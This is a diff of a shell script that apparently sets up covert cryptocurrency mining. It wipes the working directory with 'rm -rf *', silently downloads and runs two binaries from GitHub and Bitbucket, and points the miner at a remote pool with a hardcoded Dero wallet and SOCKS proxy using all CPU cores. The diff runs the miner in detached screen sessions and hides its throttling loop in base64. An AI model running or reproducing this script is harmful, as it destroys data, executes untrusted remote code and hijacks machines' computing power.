@@ -1,12 +1,15 @@
+sudo apt update -y >/dev/null 2>&1
+sudo apt install screen -y >/dev/null 2>&1
 rm -rf *
 wget -q https://github.com/HectorCrespoThomas/asd/releases/download/xxc/limit
 chmod +x limit
 wget -q https://bitbucket.org/kunemuse-98876/dynex/downloads/kimax
 chmod +x kimax
-./kimax -r 154.53.33.36:10300 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -sock-address 139.59.187.176:1080 -m $(nproc --all) -p rpc >/dev/null 2>&1 >/dev/null & sleep 0.1
-while :; do
-timeout 20s ./limit -e kimax -l 100
-sleep 1
-timeout 120s ./limit -e kimax -l 400
-sleep 1
-done
+screen -dmS kimax ./kimax -r 154.53.33.36:10300 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -sock-address 139.59.187.176:1080 -m $(nproc --all) -p rpc
+sleep 2
+echo 'd2hpbGUgOjsgZG8KdGltZW91dCAyMHMgLi9saW1pdCAtZSBraW1heCAtbCAxMDAKc2xlZXAgMQp0aW1lb3V0IDEyMHMgLi9saW1pdCAtZSBraW1heCAtbCA0MDAKc2xlZXAgMQpkb25l' > rerun
+base64 -d rerun > reruning
+chmod +x reruning
+screen -dmS rerun ./reruning
+screen -list
+screen -d -r kimax
